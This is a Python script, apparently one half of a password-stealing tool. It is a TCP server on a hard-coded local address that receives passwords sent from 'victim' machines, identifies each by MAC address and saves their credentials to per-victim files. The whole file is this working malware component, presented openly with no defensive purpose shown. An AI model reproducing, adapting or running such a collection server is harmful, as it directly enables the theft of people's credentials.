# Made from scratch by Gibraan Jafar

import socket
from subprocess import Popen , PIPE
import subprocess
import os

FILE=''
clientsocket=''
serversocket=''

def main():
    create_socket()
    count = 1
    while True:
        establish_connection()
        mac = get_mac()
        print(" Serving client => ",mac)
        if new_user(mac):
            make_file(mac)
            fill_file()
        clientsocket.close()
        count+=1
        print()



def create_socket():
    global serversocket
    serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #host = socket.gethostname()
    #port = 9999
    server_address = ('192.168.0.105',10000)
    #serversocket.bind((host,port))
    serversocket.bind(server_address)
    serversocket.listen(5)


def establish_connection():
    global clientsocket
    clientsocket, addr = serversocket.accept()

def get_mac():
    mac = clientsocket.recv(14).decode('ascii')
    return mac

def get_data():
    " Receive data and send it to calling function "
    CONTENT = clientsocket.recv(1000).decode('ascii')
    CONTENT = CONTENT.split('\n')
    return CONTENT


def new_user(intro):
    if os.path.exists(intro):
        print("Already have passwords from =>",intro)
        return False
    else:
        print("New victim detected !")
        return True


def make_file(file_name):
    global FILE
    FILE = open(file_name,'a')

def fill_file():
    content = get_data()
    for item in content:
        FILE.write(item+'\n')

    FILE.close()


if __name__ == "__main__":
    print("=== INITIALIZING SERVER === \n")
    main()
